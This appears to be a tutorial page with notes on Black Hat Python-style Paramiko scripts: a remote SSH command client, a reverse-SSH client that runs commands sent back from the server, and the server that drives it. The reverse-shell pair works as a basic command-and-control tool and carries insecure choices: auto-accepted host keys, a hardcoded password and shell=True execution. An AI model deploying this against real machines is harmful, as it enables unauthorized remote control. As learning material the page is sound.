# SSH with Paramiko

### [`paramiko.org`](http://paramiko.org/)

We need **`pip install paramiko`** first ****

## Code 1

### `ssh_rcmd.py`

```python
import paramiko

"""
    makes a connection to an SSH server and runs a single command.
"""
def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    # set the policyto accept the SSH key for the SSH server we’re connecting to
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    # run the command 3 that we passed in the call to the ssh_command function.
    _, stdout, stderr = client.exec_command(cmd)
    output = stdout.readlines() + stderr.readlines()
    # if the command produced output -> print each line of the output
    if output:
        print('--- Output ---')
        for line in output:
            print(line.strip())

if __name__ == '__main__':
    # use it to get the username/password from the current environment
    import getpass
    # user = getpass.getuser()
    user = input('Username: ')
    password = getpass.getpass()
    ip = input('Enter server IP: ') or '192.168.1.203'
    port = input('Enter port or <CR>: ') or 2222
    cmd = input('Enter command or <CR>: ') or 'id'
    # run and send requestd variables to be executed
    ssh_command(ip, port, user, password, cmd)
```

## Explanation 1

The code you provided establishes an SSH connection to a remote server using the Paramiko library and runs a single command on that server. Here's an explanation of the code:

1. The code imports the **`paramiko`** module, which is a Python implementation of the SSHv2 protocol.
2. The **`ssh_command`** function is defined. It takes five parameters: **`ip`** (IP address of the SSH server), **`port`** (SSH port number), **`user`** (username for authentication), **`passwd`** (password for authentication), and **`cmd`** (command to be executed on the server).
3. Inside the function, a new **`SSHClient`** object is created using **`paramiko.SSHClient()`**. This object represents an SSH client that can make connections to SSH servers.
4. The **`set_missing_host_key_policy`** method is called on the client object to set the policy for automatically accepting the SSH server's host key. This allows the client to connect to servers without prompting the user to confirm the key's authenticity.
5. The **`connect`** method is called on the client object to establish the SSH connection. It takes the IP address (**`ip`**), port number (**`port`**), username (**`user`**), and password (**`passwd`**) as arguments.
6. The **`exec_command`** method is called on the client object to run the specified command (**`cmd`**) on the remote server. It returns three file-like objects: **`stdin`** (not used here), **`stdout`** (output from the command), and **`stderr`** (error output from the command).
7. The output from the command is read line by line using the **`readlines`** method on **`stdout`** and **`stderr`**. The lines are concatenated into a list called **`output`**.
8. If the **`output`** list is not empty (i.e., the command produced some output), the lines are printed one by one.
9. The script checks if it is being executed as the main module (**`if __name__ == '__main__':`**), indicating that the script is run directly rather than being imported as a module.
10. Inside the main block, the script prompts the user for their username, password, server IP address, port, and command. The **`getpass`** module is used to securely obtain the password without displaying it on the screen.
11. The **`ssh_command`** function is called with the provided input values to establish the SSH connection and execute the command on the remote server.

In summary, this code allows you to connect to an SSH server, run a command on that server, and display the command's output. It uses the Paramiko library to handle the SSH connection and execute the command remotely.

## Code 2

### `ssh_rcmd.py`

```python
import paramiko
import shlex
import subprocess

""""
    Pretty much the same as ssh_command function, but with a loop which can take more than one command
"""
def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    # set the policyto accept the SSH key for the SSH server we’re connecting to
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            # take commands from the connection
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # execute the command
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True) 
                # send any output back to the caller
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = getpass.getuser()
    password = getpass.getpass()
    ip = input('Enter server IP: ')
    port = input('Enter port: ')
    # the first command we send is ClientConnected
    ssh_command(ip, port, user, password, 'ClientConnected')
```

- Pretty much the same as `ssh_command` function in `ssh_cmd.py`, but with a loop which can take more than one command.

## Code 3

### `ssh_server.py`

```python
# Copyright (C) 2023 BLACK HAT PYTHON, Modified By Saman Pordanesh

""""
    creates an SSH server for our SSH client (where we’ll run commands) to connect to.
"""

import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
# using the SSH key included in the Paramiko demo files
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

# SSH-inize
class Server (paramiko.ServerInterface):
    def _init_(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (username == 'sina') and (password == '12345'): # hard coded username and password. This can be changed.
            return paramiko.AUTH_SUCCESSFUL
        

if __name__ == '__main__':
    server = '127.0.0.1'    # you can modify this
    ssh_port = 2222         # you can modify this
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # start a socket listener
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print('[-] Listen failed: ' + str(e))
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # configure the authentication methods
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    bhSession.start_server(server=server)

    chan = bhSession.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to bh_ssh')
    try:
        while True:
            command= input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
```

## Explanation 3

The code provided sets up an SSH server that allows an SSH client to connect and run commands remotely. Let's break down the code:

1. The code begins with some import statements to import the necessary modules, including **`os`**, **`paramiko`**, **`socket`**, and **`sys`**.
2. The variable **`CWD`** is assigned the current working directory of the script.
3. The **`HOSTKEY`** variable is set to the RSA key file (**`test_rsa.key`**) located in the same directory as the script.
4. The code defines a class called **`Server`** that extends **`paramiko.ServerInterface`**. This class implements methods to handle channel requests and password authentication. In this case, it allows only a "session" channel request and checks for a specific hardcoded username and password (**`sina`** and **`12345`**) for authentication.
5. Inside the **`__main__`** block, the server IP address (**`127.0.0.1`**) and SSH port (**`2222`**) are assigned to the variables **`server`** and **`ssh_port`**, respectively.
6. A socket is created, bound to the server IP address and SSH port, and set to listen for incoming connections.
7. If a connection is accepted, the code proceeds to configure the authentication methods by creating a **`paramiko.Transport`** object called **`bhSession`** and adding the server key (**`HOSTKEY`**) to it.
8. An instance of the **`Server`** class is created and passed as an argument to **`bhSession.start_server()`** to start the SSH server.
9. The code then accepts a channel (**`chan`**) from the SSH session within a certain timeout period.
10. If the channel is successfully accepted, the code prints an "Authenticated!" message and proceeds to handle user input and command execution.
11. Inside a loop, the user is prompted to enter a command. If the command is not "exit," it is sent through the channel to the SSH client. The response from the client is received and printed.
12. If the user enters "exit," the command is sent, and the loop is terminated, closing the SSH session.
13. An exception handler is in place to catch a keyboard interruption (**`KeyboardInterrupt`**) and gracefully close the SSH session.

Overall, this code sets up a basic SSH server that listens for connections, authenticates clients based on a hardcoded username and password, and allows the execution of commands on the remote client.